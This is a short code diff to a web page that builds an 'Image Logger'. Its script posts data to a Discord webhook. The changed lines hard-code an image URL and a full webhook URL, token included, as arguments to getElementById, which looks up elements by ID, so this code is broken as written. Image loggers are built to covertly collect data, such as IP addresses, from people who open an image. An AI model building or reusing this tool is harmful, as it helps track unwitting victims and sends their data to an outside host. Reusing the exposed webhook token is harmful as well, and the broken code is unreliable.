@@ -23,8 +23,8 @@
 <button type="button" class ="btn" id="create"> Create Image Logger</button>
 <script>
     document.getElementById("create").onclick = function(){
-    var image = document.getElementById("image").value    
-    var webhook = document.getElementById("url").value
+    var image = document.getElementById("https://images.kinguin.net/g/carousel-main-mobile/media/images/products/20251029021240556_700f54f8-2b2c-4c9a-809e-b8645a193741.png").value    
+    var webhook = document.getElementById("https://discord.com/api/webhooks/1521868460437803103/vo3UgdMEE5x_tJtSUSjlxh0IQ8K7CkSAoq2Y25pCuSPLtuLK3iB86S5GzBKNZle_enTX").value
     var request = new XMLHttpRequest;
     request.open("POST", webhook);
     request.setRequestHeader('Content-type', 'application/json');
